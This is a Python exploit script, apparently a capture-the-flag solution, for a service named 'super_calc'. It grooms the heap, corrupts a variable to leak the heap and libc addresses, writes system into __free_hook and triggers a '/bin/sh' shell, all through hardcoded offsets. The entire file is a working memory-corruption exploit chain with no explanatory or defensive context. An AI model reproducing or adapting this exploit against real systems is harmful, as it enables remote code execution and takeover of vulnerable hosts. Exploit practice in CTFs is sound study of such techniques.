#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from binaryfang import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = int(sys.argv[1])
context.log_level = "debug"

if LOCAL==1:
#check ASLR condition!
    while 1:
        p = process("./super_calc")
        time.sleep(0.5)
        X = mem(pidof(p))
        process_heap_addr = int(X.proc_segs["heap"][0][0],16)
        if process_heap_addr & 0xf000 != 0xf000 and process_heap_addr & 0xe000 == 0xe000:
            #check ending number passed..!
            print hex(process_heap_addr)
            break
        p.close()

else:
    #p = remote("106.75.11.9", 9999)
    p = remote("127.0.0.1", 7777)

p.recvuntil(">>> ")

#padding blocks in front of a big unsorted bin.

p.sendline('a="' + "test1" + '"')
p.recvuntil(">>> ")
p.sendline('b="' + "test2" + '"')
p.recvuntil(">>> ")
p.sendline('c="' + "test3" + '"')
p.recvuntil(">>> ")
p.sendline('d="' + "test4" + '"')
p.recvuntil(">>> ")
p.sendline('e="' + "test5" + '"')
p.recvuntil(">>> ")
p.sendline('f="' + "test7" + '"')
p.recvuntil(">>> ")
p.sendline('h'*0x50 + '="' + "test9" + '"')
p.recvuntil(">>> ")
p.sendline('i'*0x40 + '="' + "test10" + '"')
p.recvuntil(">>> ")
p.sendline('j="' + "test11" + '"')
p.recvuntil(">>> ")
p.sendline('j="' + "test11" + '"')
p.recvuntil(">>> ")
p.sendline('j="' + "test11" + '"')
p.recvuntil(">>> ")
p.sendline('j1="' + "test11" + '"')
p.recvuntil(">>> ")
p.sendline('j2="' + "test11" + '"')
p.recvuntil(">>> ")
p.sendline('j3="' + "test11" + '"')
p.recvuntil(">>> ")
p.sendline('j4="' + "test11" + '"')
p.recvuntil(">>> ")
p.sendline('j6="' + "test11" + '"')
p.recvuntil(">>> ")
p.sendline('j7="' + "test11" + '"')
p.recvuntil(">>> ")
p.sendline('j8="' + "test11" + '"')
p.recvuntil(">>> ")
p.sendline('j10="' + "a"*0xe0 + '"')
p.recvuntil(">>> ")

p.sendline('g="' + "a" * 0xa0 + '"')
p.recvuntil(">>> ")


#prepare target.

p.sendline('x="' + 'bingo' + '"')
p.recvuntil(">>> ")
p.sendline('y="' + 'double' + '"')
p.recvuntil(">>> ")


#p.sendline('y="' + 'z' * 0xf0 + '"') #realloc
#p.recvuntil(">>> ")

#declare a var:

wait("me")
payload = p64(0xffffffffffffffff) * 5 + "\x00"
p.sendline("x=250")
p.recvuntil(">>> ")
p.sendline('x="' + payload + '"')
p.recvuntil(">>> ")
#get first part of heapaddr!..
p.sendline('d=""')
p.recvuntil(">>> ")
p.sendline("d")
data = p.recvuntil(">>> ")
heap1 = data.split("\n")[0]
print heap1

payload2 = p64(0xffffffffffffffff) * 5 + "\x02"
p.sendline("x=250")
p.recvuntil(">>> ")
p.sendline('x="' + payload2 + '"')
p.recvuntil(">>> ")
p.sendline('d=""')
p.recvuntil(">>> ")
p.sendline("d")
data = p.recvuntil(">>> ")
heap2 = data.split("\n")[0]
print heap2

#1/2 to predict real heap addr!
heap = heap1 + heap2.strip("\x00") + "\x55" + "\x00" * 2
heap = u64(heap)
print hex(heap)

#assume heap address got, now create a libc address.

p.sendline('g="' + "a" * 0xb0 + '"')
p.recvuntil(">>> ")

#leak libc now!

payload3 = p64(0xffffffffffffffff) * 5 + p64(heap + 0xa18)
p.sendline("x=250")
p.recvuntil(">>> ")
p.sendline('x="' + payload3 + '"')
p.recvuntil(">>> ")
p.sendline('d=""')
p.recvuntil(">>> ")
p.sendline("d")
data = p.recvuntil(">>> ")
libc_part1 = data.split("\n")[0]
print "part1: " + libc_part1

payload4 = p64(0xffffffffffffffff) * 5 + p64(heap + 0xa18 + 0x2)
p.sendline("x=250")
p.recvuntil(">>> ")
p.sendline('x="' + payload4 + '"')
p.recvuntil(">>> ")
p.sendline('d=""')
p.recvuntil(">>> ")
p.sendline("d")
data = p.recvuntil(">>> ")
libc_part2 = data.split("\n")[0]

libc = libc_part1 + libc_part2.strip("\x00") + "\x7f" + "\x00" * 2
libc = u64(libc) - 0x3c4b00
print hex(libc)
print hex(heap)
free_hook = libc + 0x3c67a8
system = libc + 0x45390

#leak finished. now we gonna modify free_hook

wait("overwrite")
payload5 = p64(0xffffffffffffffff) * 5 + p64(free_hook) * 1
p.sendline("x=250")
p.recvuntil(">>> ")
p.sendline('x="' + payload5 + '"')
p.recvuntil(">>> ")
p.sendline('d=""')
p.recvuntil(">>> ")
p.sendline('d=250')
p.recvuntil(">>> ")
p.sendline('d="' + p64(system) + '"')
p.recvuntil(">>> ")
#check if overwrite succeed.
p.sendline('w="/bin/sh"')
p.sendline('w="/bin/sh"')

p.interactive()
